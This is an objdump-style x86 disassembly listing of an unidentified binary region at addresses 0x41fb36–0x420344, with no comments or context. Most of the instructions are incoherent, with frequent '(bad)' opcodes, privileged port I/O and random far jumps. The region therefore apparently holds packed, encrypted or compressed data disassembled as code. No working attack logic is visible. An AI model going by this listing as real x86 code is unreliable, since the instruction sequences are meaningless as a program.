  41fb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb37:	call   0xd380:0xc1a481ad
  41fb3e:	mov    cl,0xf
  41fb40:	mov    dl,0x22
  41fb42:	jo     0x41fba6
  41fb44:	adc    eax,0x311a81b2
  41fb49:	xchg   ebx,eax
  41fb4a:	add    edx,ebx
  41fb4c:	outs   dx,DWORD PTR ds:[esi]
  41fb4d:	loopne 0x41fb50
  41fb4f:	xor    al,0xc4
  41fb51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb52:	cmp    eax,0x1fd8e395
  41fb57:	sbb    BYTE PTR [esi+0x4de7aa41],dh
  41fb5d:	xchg   edi,eax
  41fb5e:	inc    ecx
  41fb5f:	repnz mov esi,0x387d8a00
  41fb65:	xchg   edx,eax
  41fb66:	(bad)  
  41fb68:	xor    BYTE PTR [eax],0xb0
  41fb6b:	dec    esi
  41fb6c:	inc    edi
  41fb6d:	adc    bl,BYTE PTR [esp+eiz*2-0x46cd46bd]
  41fb74:	test   DWORD PTR [edx+0x470f64c2],0x598d7770
  41fb7e:	push   edx
  41fb7f:	cmc    
  41fb80:	sti    
  41fb81:	repz leave 
  41fb83:	add    al,bl
  41fb85:	mov    al,bh
  41fb87:	inc    ecx
  41fb88:	xor    al,ah
  41fb8a:	or     eax,0x95bbb5cd
  41fb8f:	fstp   st(5)
  41fb91:	and    DWORD PTR [eax-0x38],edx
  41fb94:	cmp    ah,ah
  41fb96:	cmp    ebp,esi
  41fb98:	and    DWORD PTR [ecx],esi
  41fb9a:	sub    eax,0xb7fa5356
  41fb9f:	lods   eax,DWORD PTR ds:[esi]
  41fba0:	pop    ebp
  41fba1:	add    cl,BYTE PTR [ebx+0x4a]
  41fba4:	inc    esp
  41fba5:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41fba7:	iretw  
  41fba9:	push   edx
  41fbaa:	fdivrp st(0),st
  41fbac:	sahf   
  41fbad:	bnd jo 0x41fbb7
  41fbb0:	aas    
  41fbb1:	sbb    ecx,DWORD PTR [edx+0x12]
  41fbb4:	out    0x2a,al
  41fbb6:	cli    
  41fbb7:	mov    dh,0xab
  41fbb9:	push   cs
  41fbba:	fdiv   DWORD PTR [edx]
  41fbbc:	cmp    BYTE PTR [esi],bl
  41fbbe:	mov    al,ds:0xf4a415a1
  41fbc3:	adc    eax,0x976db6a0
  41fbc8:	inc    ebp
  41fbc9:	pop    esp
  41fbca:	inc    ebp
  41fbcb:	rcl    BYTE PTR [edx],cl
  41fbcd:	out    0x88,al
  41fbcf:	mov    ds:0x233ddf19,eax
  41fbd4:	xchg   ecx,eax
  41fbd5:	and    al,0x64
  41fbd7:	dec    edx
  41fbd8:	rcr    al,1
  41fbda:	mov    bh,0xc
  41fbdc:	pop    ds
  41fbdd:	sbb    eax,0x75
  41fbe0:	hlt    
  41fbe1:	jb     0x41fc0d
  41fbe3:	adc    eax,DWORD PTR [edx]
  41fbe5:	mov    DWORD PTR [esi-0x7021defc],eax
  41fbeb:	sub    al,0x86
  41fbed:	popa   
  41fbee:	jp     0x41fbfb
  41fbf0:	jmp    0x71c53dd4
  41fbf5:	arpl   WORD PTR [ebx+0x28],ax
  41fbf8:	inc    eax
  41fbf9:	popa   
  41fbfa:	jmp    0xce38512e
  41fbff:	call   FWORD PTR [ecx]
  41fc01:	mov    WORD PTR [ebx+0x3801811f],fs
  41fc07:	icebp  
  41fc08:	inc    ebp
  41fc09:	jecxz  0x41fbc0
  41fc0b:	ds call 0x715a:0x30d78ec4
  41fc13:	mov    esi,0x98797dc6
  41fc18:	sar    DWORD PTR [ebx-0x27],cl
  41fc1b:	mov    edi,DWORD PTR [edi+edx*8+0x2b]
  41fc1f:	push   ss
  41fc20:	push   ebp
  41fc21:	jnp    0x41fbf5
  41fc23:	fdivr  DWORD PTR [eax+0x12832150]
  41fc29:	lds    esi,FWORD PTR [esi-0x35954cef]
  41fc2f:	rcl    DWORD PTR [ecx],0x90
  41fc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc33:	daa    
  41fc34:	test   eax,0x35ad9087
  41fc39:	sbb    al,0x88
  41fc3b:	in     eax,0xae
  41fc3d:	xlat   BYTE PTR ds:[ebx]
  41fc3e:	popa   
  41fc3f:	sub    DWORD PTR [eax],eax
  41fc41:	loop   0x41fbc8
  41fc43:	iret   
  41fc44:	ds popf 
  41fc46:	lds    ebx,FWORD PTR [esi+ecx*2+0x50]
  41fc4a:	(bad)  
  41fc4c:	ds js  0x41fbfd
  41fc4f:	jp     0x41fc59
  41fc51:	int3   
  41fc52:	fnsave ds:0x749c68ad
  41fc58:	out    dx,al
  41fc59:	push   cs
  41fc5a:	add    DWORD PTR ds:0x52ae37aa,esi
  41fc60:	add    dh,BYTE PTR [eax-0x76a1a2ab]
  41fc66:	fidivr DWORD PTR [edi+0x16fca9af]
  41fc6c:	sahf   
  41fc6d:	into   
  41fc6e:	sbb    ebp,ecx
  41fc70:	and    eax,0x659b4960
  41fc75:	inc    esp
  41fc76:	je     0x41fc53
  41fc78:	outs   dx,BYTE PTR ds:[esi]
  41fc79:	pop    eax
  41fc7a:	mov    esi,0xb0101fd8
  41fc7f:	fcmovnb st,st(4)
  41fc81:	retf   0xb000
  41fc84:	jge    0x41fc8a
  41fc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc87:	stc    
  41fc88:	and    DWORD PTR [ecx+0x21bde58a],esi
  41fc8e:	dec    esi
  41fc8f:	test   DWORD PTR [ecx+0x1d],eax
  41fc92:	ret    
  41fc93:	xchg   ebx,eax
  41fc94:	push   es
  41fc95:	ror    ecx,0xf0
	...
  41fd14:	xchg   edi,edx
  41fd16:	dec    ebp
  41fd17:	jnp    0x41fd76
  41fd19:	sti    
  41fd1a:	mov    bh,0xff
  41fd1c:	ds aad 0x54
  41fd1f:	ret    0x5f28
  41fd22:	and    eax,0x19679a3
  41fd27:	add    BYTE PTR [edi+eax*1+0x0],ch
  41fd2b:	add    al,ch
  41fd2d:	cmp    cl,BYTE PTR [edx]
  41fd2f:	inc    ebp
  41fd30:	icebp  
  41fd31:	mov    DWORD PTR [ebx+0xd],0xdf3b1151
  41fd38:	cwde   
  41fd39:	out    0x72,al
  41fd3b:	mov    ds:0x114f8007,eax
  41fd40:	rcr    BYTE PTR [ebx],0x7b
  41fd43:	jge    0x41fd0c
  41fd45:	or     BYTE PTR [edi+0x2111e045],dl
  41fd4b:	sub    al,0xec
  41fd4d:	mov    ch,0x9
  41fd4f:	mov    fs,WORD PTR [edx-0x24ba4a4a]
  41fd55:	stos   DWORD PTR es:[edi],eax
  41fd56:	sub    al,0xcc
  41fd58:	loopne 0x41fdb5
  41fd5a:	pop    ecx
  41fd5b:	dec    edx
  41fd5c:	jmp    0x41fdc3
  41fd5e:	inc    ebx
  41fd5f:	(bad)  
  41fd60:	rcr    dl,1
  41fd62:	call   0x6e81d0f0
  41fd67:	add    ah,BYTE PTR [edi+eax*2-0x3fd4b013]
  41fd6e:	push   edx
  41fd6f:	rcl    ch,0x90
  41fd72:	push   esp
  41fd73:	mov    eax,0xf417c3d3
  41fd78:	pop    ebx
  41fd79:	sub    al,0x86
  41fd7b:	add    DWORD PTR [esi-0x6280d924],esp
  41fd81:	push   0xffffffee
  41fd83:	sub    esp,ebx
  41fd85:	cmp    DWORD PTR [esi-0x15],edi
  41fd88:	xchg   edx,eax
  41fd89:	fs xor al,0xbc
  41fd8c:	repnz les esp,FWORD PTR [esi-0x5a4070fc]
  41fd93:	in     al,0xc7
  41fd95:	aam    0xf3
  41fd97:	popf   
  41fd98:	xchg   esi,eax
  41fd99:	cmp    BYTE PTR [edi-0x2b75d6b2],ch
  41fd9f:	ficomp WORD PTR [bp+di+0x5b35]
  41fda4:	sbb    eax,0x63f14b88
  41fda9:	sub    al,0xc2
  41fdab:	and    BYTE PTR [edi],cl
  41fdad:	or     BYTE PTR [esp+edx*2],ah
  41fdb0:	mov    edi,0x7d77a86b
  41fdb5:	test   al,0x8a
  41fdb7:	sub    eax,0x2e6b099b
  41fdbc:	loope  0x41fe17
  41fdbe:	scas   eax,DWORD PTR es:[edi]
  41fdbf:	out    0x5e,al
  41fdc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc2:	int3   
  41fdc3:	nop
  41fdc4:	ret    0x3451
  41fdc7:	and    ah,BYTE PTR [edx-0x7e405369]
  41fdcd:	rcl    BYTE PTR [esi-0x18ffecab],0x6
  41fdd4:	stos   BYTE PTR es:[edi],al
  41fdd5:	sub    bl,BYTE PTR [eax+0x47]
  41fdd8:	sbb    eax,0x480587cc
  41fddd:	cli    
  41fdde:	out    0x55,al
  41fde0:	sahf   
  41fde1:	(bad)  
  41fde2:	mov    ds,WORD PTR [esi]
  41fde4:	push   edx
  41fde5:	pcmpeqd mm7,QWORD PTR [ebp-0x5cf28340]
  41fdec:	stos   BYTE PTR es:[edi],al
  41fded:	popa   
  41fdee:	clc    
  41fdef:	into   
  41fdf0:	repz stc 
  41fdf2:	in     eax,dx
  41fdf3:	mov    cl,BYTE PTR [esi+0x467138cf]
  41fdf9:	mov    ecx,0x2097e915
  41fdfe:	add    DWORD PTR ds:0x19199d8c,0x610fb1e3
  41fe08:	dec    BYTE PTR [edi-0x6a]
  41fe0b:	je     0x41fdfa
  41fe0d:	xchg   bp,ax
  41fe0f:	sub    eax,0x4fb2d79d
  41fe14:	xor    BYTE PTR [ecx],dl
  41fe16:	or     dh,ah
  41fe18:	popf   
  41fe19:	aam    0x7b
  41fe1b:	(bad)  
  41fe1c:	int3   
  41fe1d:	push   cs
  41fe1e:	iret   
  41fe1f:	sbb    al,0xe5
  41fe21:	fwait
  41fe22:	pop    ebp
  41fe23:	inc    edi
  41fe24:	test   esi,edx
  41fe26:	ins    BYTE PTR es:[edi],dx
  41fe27:	sub    esi,DWORD PTR [ecx-0x4603553b]
  41fe2d:	cmp    DWORD PTR [edi-0x7],esp
  41fe30:	adc    DWORD PTR [edx],0x52378df7
  41fe36:	into   
  41fe37:	sbb    edi,esi
  41fe39:	or     eax,esi
  41fe3b:	push   ecx
  41fe3c:	push   edx
  41fe3d:	jmp    0xe14e9873
  41fe42:	icebp  
  41fe43:	adc    esp,DWORD PTR [edx-0x59]
  41fe46:	mov    bl,0x31
  41fe48:	mov    eax,ds:0xd93f0698
  41fe4d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41fe4f:	stc    
  41fe50:	add    al,0x78
  41fe52:	pusha  
  41fe53:	retf   0xc967
  41fe56:	cli    
  41fe57:	mov    esi,0x7f0ed101
  41fe5c:	and    BYTE PTR [eax-0x74658b3b],dl
  41fe62:	inc    esi
  41fe63:	les    esi,FWORD PTR [ecx+0x76]
  41fe66:	inc    ebp
  41fe67:	out    dx,al
  41fe68:	mov    ebp,gs
  41fe6a:	es mov ah,0xaf
  41fe6d:	push   0xace5c4d3
  41fe72:	ins    DWORD PTR es:[edi],dx
  41fe73:	jmp    0x41fee1
  41fe75:	aaa    
  41fe76:	cli    
  41fe77:	dec    eax
  41fe78:	add    bl,BYTE PTR [ebp+0x7d]
  41fe7b:	outs   dx,DWORD PTR ds:[esi]
  41fe7c:	dec    esi
  41fe7d:	js     0x41fef2
  41fe7f:	mov    ds:0x18543a52,eax
  41fe84:	hlt    
  41fe85:	(bad)  
  41fe86:	xor    DWORD PTR [ebp-0x1c],esp
  41fe89:	or     BYTE PTR [esi],al
  41fe8b:	rcl    DWORD PTR [ecx],cl
  41fe8d:	sub    ch,BYTE PTR [ecx+ebp*1]
  41fe90:	cmp    esp,ecx
  41fe92:	xchg   BYTE PTR [esi-0x36419812],ah
  41fe98:	outs   dx,BYTE PTR ds:[esi]
  41fe99:	cli    
  41fe9a:	mov    bl,0xb8
  41fe9c:	into   
  41fe9d:	push   ds
  41fe9e:	jp     0x41fe44
  41fea0:	imul   edi,edx,0xffffffc8
  41fea3:	push   ds
  41fea4:	pop    ebp
  41fea5:	xchg   ebp,eax
  41fea6:	or     al,0xdc
  41fea8:	cmp    ebx,DWORD PTR [eax+0x7969bfb1]
  41feae:	and    al,0x90
  41feb0:	scas   eax,DWORD PTR es:[edi]
  41feb1:	lods   al,BYTE PTR ds:[esi]
  41feb2:	inc    eax
  41feb3:	mov    ecx,0x6930c084
  41feb8:	nop
  41feb9:	inc    ebx
  41feba:	and    BYTE PTR [eax-0x74eb11ac],al
  41fec0:	add    bh,BYTE PTR [edi]
  41fec2:	or     al,0xd9
  41fec4:	xchg   esi,eax
  41fec5:	int    0x5
  41fec7:	inc    ecx
  41fec8:	seto   BYTE PTR [edx-0x34fc5c06]
  41fecf:	cs xchg esp,eax
  41fed1:	int    0x8c
  41fed3:	mov    bl,0x5b
  41fed6:	loop   0x41fe60
  41fed8:	push   edi
  41fed9:	inc    ecx
  41feda:	lock jnp 0x41fec0
  41fedd:	lds    ebp,FWORD PTR [ecx+0x1c]
  41fee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fee1:	fadd   DWORD PTR [eax+0x57]
  41fee4:	cwde   
  41fee5:	out    0x62,eax
  41fee7:	pop    edi
  41fee8:	shl    DWORD PTR [ebx],0x52
  41feeb:	(bad)  
  41feec:	mov    fs,WORD PTR [ebx]
  41feee:	mov    ds,WORD PTR [edi]
  41fef0:	stos   DWORD PTR es:[edi],eax
  41fef1:	xor    cl,BYTE PTR [edx-0x64763459]
  41fef7:	clc    
  41fef8:	aam    0x5c
  41fefa:	icebp  
  41fefb:	push   esp
  41fefc:	push   ss
  41fefd:	mov    al,ds:0x78e3ef26
  41ff03:	lea    ebx,[esi-0x2]
  41ff06:	jecxz  0x41ff14
  41ff08:	cmp    al,bh
  41ff0a:	adc    al,0x9
  41ff0c:	loopne 0x41ff48
  41ff0e:	dec    ecx
  41ff0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff10:	(bad)  
  41ff11:	xchg   ecx,eax
  41ff12:	inc    ebp
  41ff13:	shr    DWORD PTR [edi-0xb],0x41
  41ff17:	jp     0x41ff0a
  41ff19:	ret    
  41ff1a:	mov    esi,0xb2e71bd5
  41ff1f:	iret   
  41ff20:	std    
  41ff21:	add    eax,0xe354cf21
  41ff26:	movlps xmm1,QWORD PTR [edi+eax*1+0x40f47576]
  41ff2e:	push   cs
  41ff2f:	pop    edx
  41ff30:	frstor [ecx-0x31e791fd]
  41ff36:	or     ecx,ebp
  41ff38:	xlat   BYTE PTR ds:[ebx]
  41ff39:	push   edi
  41ff3a:	inc    eax
  41ff3b:	push   esp
  41ff3c:	jne    0x41fed8
  41ff3e:	pop    edi
  41ff3f:	in     eax,dx
  41ff40:	lods   al,BYTE PTR ds:[esi]
  41ff41:	push   cs
  41ff42:	adc    dl,dh
  41ff44:	inc    ebx
  41ff45:	or     dl,BYTE PTR ds:0x6d34f686
  41ff4b:	xchg   DWORD PTR [ecx+eiz*2+0x67b6c7bd],ebp
  41ff52:	out    0xe,eax
  41ff54:	into   
  41ff55:	cmp    BYTE PTR [ecx],0xff
  41ff58:	je     0x41ffca
  41ff5a:	lock jo 0x41ffa7
  41ff5d:	or     cl,BYTE PTR ds:0xa8fb8bc2
  41ff63:	cwde   
  41ff64:	lods   al,BYTE PTR ds:[esi]
  41ff65:	xchg   ebx,eax
  41ff66:	cmp    esi,DWORD PTR [ebx+0x1144255b]
  41ff6c:	sub    edx,DWORD PTR [ecx+0x28]
  41ff6f:	xchg   ebx,eax
  41ff70:	pop    ebx
  41ff71:	jae    0x41ff7c
  41ff73:	xchg   DWORD PTR [edx+0x75ddcb24],ecx
  41ff79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff7a:	scas   eax,DWORD PTR es:[edi]
  41ff7b:	mov    edx,0x8ac5a00d
  41ff80:	pushf  
  41ff81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff82:	add    edx,DWORD PTR [ebx-0xe3544c3]
  41ff88:	sub    DWORD PTR [esi],edx
  41ff8a:	mov    eax,ds:0xbd443323
  41ff8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff90:	mov    edi,edi
  41ff92:	jo     0x41ff61
  41ff94:	jnp    0x41ff68
  41ff96:	fwait
  41ff97:	push   0x59ec87e2
  41ff9c:	popf   
  41ff9d:	sub    DWORD PTR [ebp-0x5577c4a1],esi
  41ffa3:	imul   ecx,DWORD PTR [eax-0x6c],0x42
  41ffa7:	repnz (bad) 
  41ffaa:	add    DWORD PTR [ecx+0x40],ebx
  41ffad:	daa    
  41ffae:	and    BYTE PTR [ecx+0x41e10639],dh
  41ffb4:	xor    dl,ah
  41ffb6:	push   ecx
  41ffb7:	out    dx,al
  41ffb8:	out    0xa2,al
  41ffba:	mov    dh,0x3f
  41ffbc:	ror    DWORD PTR [eax-0x29],1
  41ffbf:	stc    
  41ffc0:	and    DWORD PTR [edx],esp
  41ffc2:	in     eax,dx
  41ffc3:	inc    edx
  41ffc4:	retf   
  41ffc5:	retf   
  41ffc6:	cmp    eax,0x835a0720
  41ffcb:	in     al,0x7e
  41ffcd:	xor    eax,0x836afb2a
  41ffd2:	and    ebx,ebp
  41ffd4:	cmp    al,0x2e
  41ffd6:	aas    
  41ffd7:	sbb    BYTE PTR [edx-0x3e],ch
  41ffda:	xor    al,0xd3
  41ffdc:	pusha  
  41ffdd:	inc    ebp
  41ffde:	adc    BYTE PTR [ebx],dh
  41ffe0:	pop    ss
  41ffe1:	cmp    BYTE PTR [esi+0x5f16e451],bh
  41ffe7:	inc    esi
  41ffe8:	cmp    DWORD PTR [ebx+0x76],edx
  41ffeb:	iret   
  41ffec:	shl    BYTE PTR [eax+0x1d3367aa],1
  41fff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fff3:	lods   al,BYTE PTR ds:[esi]
  41fff4:	faddp  st(1),st
  41fff6:	es push esi
  41fff8:	mov    ch,0xda
  41fffa:	nop
  41fffb:	test   eax,0x2dbe6d20
  420000:	test   BYTE PTR [eax],dl
  420002:	sub    esi,DWORD PTR [esi+ebx*8+0x17]
  420006:	out    dx,eax
  420007:	imul   edi,eax,0x71
  42000a:	or     DWORD PTR [ecx],0x12124ce4
  420010:	and    BYTE PTR [edi],al
  420012:	add    al,0x42
  420014:	sti    
  420015:	fst    st(6)
  420017:	mov    al,0x22
  420019:	sar    DWORD PTR [ebp+0xc1330a4],cl
  42001f:	aam    0x41
  420021:	fcmovnbe st,st(6)
  420023:	pushf  
  420024:	inc    ecx
  420025:	sbb    al,0x3d
  420027:	mov    ds:0x96bc9041,al
  42002c:	jmp    0xb51:0xc0c0d487
  420033:	dec    ebp
  420034:	fiadd  DWORD PTR [edi]
  420036:	stos   BYTE PTR es:[edi],al
  420037:	and    ah,BYTE PTR [edx-0x36e3b445]
  42003d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42003e:	cmp    ch,BYTE PTR [eax-0x4e]
  420041:	imul   eax,edx,0xc66e0953
  420047:	xchg   ebx,eax
  420048:	jnp    0x42008c
  42004a:	xchg   edi,eax
  42004b:	cmc    
  42004c:	aad    0x7e
  42004e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42004f:	mov    DWORD PTR [edx],esp
  420051:	arpl   WORD PTR [edx],sp
  420053:	cmp    al,0xc7
  420055:	xor    al,0xbe
  420057:	loope  0x41fffa
  420059:	ins    BYTE PTR es:[edi],dx
  42005a:	mov    dh,0x4d
  42005c:	jns    0x4200b1
  42005e:	nop
  42005f:	dec    eax
  420060:	scas   al,BYTE PTR es:[edi]
  420061:	add    DWORD PTR [eax],eax
  420063:	cli    
  420064:	jnp    0x41fffa
  420066:	pusha  
  420067:	add    DWORD PTR [edi-0x1c],0xa57d8fc7
  42006e:	jbe    0x420015
  420070:	mov    eax,ds:0xa448a0ae
  420075:	out    0x4e,eax
  420077:	dec    ecx
  420078:	rcr    DWORD PTR [edx+0x1e2c93f],cl
  42007e:	and    DWORD PTR [ecx],ebp
  420080:	mov    eax,0xdbb2634c
  420085:	inc    edx
  420086:	xor    al,0x79
  420088:	xchg   ebx,eax
  420089:	fistp  WORD PTR [ebx+0x35]
  42008c:	cmp    al,0xe7
  42008e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42008f:	lock out 0xbd,al
  420092:	lahf   
  420093:	retf   0x68dd
  420096:	rcr    ebp,0xbb
  420099:	arpl   WORD PTR [edi-0x7fc155ce],di
  42009f:	jno    0x420108
  4200a1:	out    0x16,al
  4200a3:	lods   eax,DWORD PTR ds:[esi]
  4200a4:	mov    al,0x29
  4200a6:	clc    
  4200a7:	add    bh,BYTE PTR ds:0x99afd908
  4200ad:	lahf   
  4200ae:	push   0x49
  4200b0:	cwde   
  4200b1:	leave  
  4200b2:	das    
  4200b3:	(bad)  
  4200b4:	pop    ds
  4200b5:	cld    
  4200b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b7:	push   esi
  4200b8:	mov    ch,0xcc
  4200ba:	and    DWORD PTR [esi],eax
  4200bc:	add    BYTE PTR [ebx-0x2d],bh
  4200bf:	test   eax,0x8bb8ae41
  4200c4:	jae    0x4200f6
  4200c6:	sbb    DWORD PTR [eax+ecx*8],ebp
  4200c9:	es mov BYTE PTR fs:[ebp+eax*8-0x7f],dl
  4200cf:	inc    esi
  4200d0:	test   DWORD PTR [ecx+0x56],ecx
  4200d3:	or     bh,0xf4
  4200d6:	data16 or bl,BYTE PTR [esi-0x76]
  4200da:	iret   
  4200db:	lock pop ebp
  4200dd:	lods   al,BYTE PTR ds:[esi]
  4200de:	jecxz  0x420154
  4200e0:	pop    esi
  4200e1:	test   eax,edx
  4200e3:	push   ss
  4200e4:	arpl   WORD PTR ds:0x98450dd,si
  4200ea:	add    eax,0xaf95e5
  4200ef:	sub    eax,0x66727c23
  4200f4:	push   edi
  4200f5:	and    DWORD PTR [ecx-0xa7b7bda],esi
  4200fb:	pop    ds
  4200fc:	xor    eax,DWORD PTR [ebx+esi*8-0x61aafada]
  420103:	lock sub dh,BYTE PTR [ebx]
  420106:	and    DWORD PTR [ecx-0x21],0xa3d375b5
  42010d:	mov    edx,0xedce2d1
  420112:	jecxz  0x42014b
  420114:	retf   0xfe54
  420117:	and    bh,ch
  420119:	cmp    esp,DWORD PTR [ecx]
  42011b:	shl    DWORD PTR [esi+0x3a],0x8d
  42011f:	and    edx,DWORD PTR [esi-0x41]
  420122:	cmp    eax,0x32948079
  420127:	aas    
  420128:	mov    ds:0xd0946d25,al
  42012d:	xchg   edx,eax
  42012e:	ret    0xa2c3
  420131:	repnz test al,0x78
  420134:	nop
  420135:	test   bh,cl
  420137:	mov    ah,bl
  420139:	fmulp  st(3),st
  42013b:	mov    al,ds:0x2d6b0acf
  420140:	add    al,0x8
  420142:	xchg   edi,eax
  420143:	jmp    0xf016e4bc
  420148:	pop    ds
  420149:	rol    ebx,0x52
  42014c:	pop    eax
  42014d:	jecxz  0x42017b
  42014f:	and    ch,0x4d
  420152:	jb     0x42013a
  420154:	jg     0x42018a
  420156:	pop    ebp
  420157:	push   ss
  420158:	imul   edi,esi,0xa75c6153
  42015e:	mov    dh,0x18
  420160:	ss scas eax,DWORD PTR es:[edi]
  420162:	je     0x4201b7
  420164:	(bad)  
  420165:	neg    BYTE PTR [ebp+0x72209b91]
  42016b:	xor    DWORD PTR [esi+0x7135109e],edx
  420171:	ret    
  420172:	ss mov edx,0x915f3874
  420178:	sar    DWORD PTR [eax-0x5176ae54],cl
  42017e:	int3   
  42017f:	outs   dx,DWORD PTR ds:[esi]
  420180:	jmp    FWORD PTR [ebp+0x3765b93d]
  420186:	adc    eax,0xd071271a
  42018b:	pop    ecx
  42018c:	in     eax,0x1
  42018e:	repnz sbb edx,esi
  420191:	fiadd  DWORD PTR [esi]
  420193:	mov    ds:0x8b88e1d0,al
  420198:	pusha  
  420199:	mov    ds:0xc7dd65fb,al
  42019e:	test   eax,0x62e315b0
  4201a3:	fnsetpm(287 only) 
  4201a5:	repnz mov eax,0x2f4cf106
  4201ab:	das    
  4201ac:	test   eax,0xc48abdc7
  4201b1:	jp     0x420151
  4201b3:	inc    BYTE PTR [edi-0x6651a9c1]
  4201b9:	sbb    BYTE PTR [ebx+0x52],bl
  4201bc:	jnp    0x4201c8
  4201be:	xor    al,BYTE PTR [ecx]
  4201c0:	add    esp,DWORD PTR es:[edi]
  4201c3:	push   DWORD PTR [esi]
  4201c5:	pop    edx
  4201c6:	mov    ebp,0xb1e373a9
  4201cb:	les    esi,FWORD PTR [ecx-0x23ff56fc]
  4201d1:	out    dx,eax
  4201d2:	outs   dx,DWORD PTR ds:[esi]
  4201d3:	or     al,0xd8
  4201d5:	jmp    0xed39:0x48e46816
  4201dc:	push   0xc6da6a2
  4201e1:	or     BYTE PTR [edx+0x5e],cl
  4201e4:	adc    bl,cl
  4201e6:	and    DWORD PTR [ebp-0x7c],edx
  4201e9:	shl    BYTE PTR [edx+eax*8],1
  4201ec:	xor    sp,WORD PTR [edx]
  4201ef:	data16 clc 
  4201f1:	add    BYTE PTR [edi],bl
  4201f3:	xor    edi,edi
  4201f5:	popa   
  4201f6:	sub    al,0x1e
  4201f8:	(bad)
  4201fc:	or     al,0x8f
  4201fe:	and    DWORD PTR [edi+0xf],ebp
  420201:	shl    BYTE PTR [eax-0x45],0x3e
  420205:	popa   
  420206:	jle    0x42018c
  420208:	add    eax,0xe9d7fe78
  42020d:	popa   
  42020e:	add    eax,0x828ebd91
  420213:	repnz (bad) 
  420215:	je     0x42024e
  420217:	out    dx,al
  420218:	cld    
  420219:	pushf  
  42021a:	out    dx,eax
  42021b:	enter  0xcb30,0x19
  42021f:	iret   
  420220:	adc    BYTE PTR [edx-0x16ccaa7],al
  420226:	imul   edx,DWORD PTR [eax-0x26],0xf0ced09c
  42022d:	adc    BYTE PTR [ebp-0x757a61e5],bl
  420233:	iret   
  420234:	cwde   
  420235:	in     al,dx
  420236:	mov    edi,0x6e18520a
  42023b:	dec    edi
  42023c:	sar    DWORD PTR [esi+0x62],0x4c
  420240:	cmc    
  420241:	and    dl,BYTE PTR [ebx+0x12ce8c10]
  420247:	mov    eax,ds:0x7989bff9
  42024c:	test   al,0x48
  42024e:	mov    bh,0xcf
  420250:	or     BYTE PTR [ebx+ecx*4-0x4a4218a8],cl
  420257:	popa   
  420258:	and    dh,al
  42025a:	leave  
  42025b:	pop    ebp
  42025c:	inc    edx
  42025d:	aad    0x92
  42025f:	sti    
  420260:	inc    esp
  420261:	and    BYTE PTR [ebx],bl
  420263:	and    al,BYTE PTR [edi-0x51]
  420266:	mov    ah,BYTE PTR [esi+eiz*2+0x28]
  42026a:	sti    
  42026b:	inc    ebx
  42026c:	mov    BYTE PTR [eax+esi*1-0x7009463b],dh
  420273:	int    0x92
  420275:	out    0x4d,eax
  420277:	fsub   st,st(6)
  420279:	(bad)  [ecx+0xd9bbdd1]
  42027f:	push   0x5c
  420281:	pop    esp
  420282:	fnsave [ecx+0xf82ea23]
  420288:	in     eax,0xec
  42028a:	mov    ss,ebp
  42028c:	pop    es
  42028d:	mov    WORD PTR [esi],cs
  42028f:	cmp    BYTE PTR [edx+0x76],0xd0
  420293:	jns    0x420293
  420295:	pop    edi
  420296:	sub    eax,0x47508ca0
  42029b:	jmp    0x420288
  42029d:	dec    eax
  42029e:	or     cl,BYTE PTR [ecx-0x8]
  4202a1:	cmp    eax,0xc937bdfd
  4202a6:	sbb    ah,BYTE PTR [eax+0x3dfd205d]
  4202ac:	push   ecx
  4202ad:	ins    BYTE PTR es:[edi],dx
  4202ae:	mov    al,0x7d
  4202b0:	popf   
  4202b1:	mov    ds:0xad09e7c0,eax
  4202b6:	in     al,dx
  4202b7:	inc    ecx
  4202b8:	pop    ds
  4202b9:	pushf  
  4202ba:	push   edx
  4202bb:	xor    ah,BYTE PTR [ebx]
  4202bd:	adc    eax,0x96a6d79b
  4202c2:	add    bl,BYTE PTR [edi]
  4202c4:	cmp    eax,0x300be585
  4202c9:	(bad)  
  4202ca:	(bad)  
  4202cb:	mov    cl,0x78
  4202cd:	imul   esi,ecx,0xffffff97
  4202d0:	mov    ?,WORD PTR [ecx+0x3f]
  4202d3:	in     al,0x48
  4202d5:	fisub  DWORD PTR [esi]
  4202d7:	cmp    eax,DWORD PTR [eax-0xc150591]
  4202dd:	scas   al,BYTE PTR es:[edi]
  4202de:	push   0xdd1e6e56
  4202e3:	mov    ebp,0x6804ff47
  4202e8:	and    eax,0x3cd6f78
  4202ed:	shr    BYTE PTR [edi],1
  4202ef:	in     al,dx
  4202f0:	or     eax,0xa4608f4c
  4202f5:	stc    
  4202f6:	or     eax,0x99ef6c29
  4202fb:	leave  
  4202fc:	sub    al,0xfe
  4202fe:	call   0xb25e:0xaf309628
  420305:	cmc    
  420306:	scas   eax,DWORD PTR es:[edi]
  420307:	in     eax,dx
  420308:	push   esp
  420309:	pusha  
  42030a:	dec    eax
  42030b:	push   edi
  42030c:	and    esi,DWORD PTR [esi]
  42030e:	xor    ebp,edi
  420310:	mov    eax,ecx
  420312:	in     al,0xbe
  420314:	pop    ebx
  420315:	mov    dl,0x88
  420317:	push   ebp
  420318:	mov    dh,0xfc
  42031a:	sar    BYTE PTR [ecx-0x80],0xf
  42031e:	repnz jmp 0x4666:0xe837c69a
  420326:	mov    edx,0xafede9fe
  42032b:	sbb    eax,0xf44db185
  420330:	sub    al,0x52
  420332:	xchg   ebx,eax
  420333:	fst    st(7)
  420335:	xchg   ebx,eax
  420336:	push   eax
  420337:	push   edx
  420338:	push   ds
  420339:	lock nop
  42033b:	inc    ebx
  42033c:	mov    BYTE PTR [eax+0x25625591],ah
  420342:	cmp    dl,al
  420344:	aad    0x21
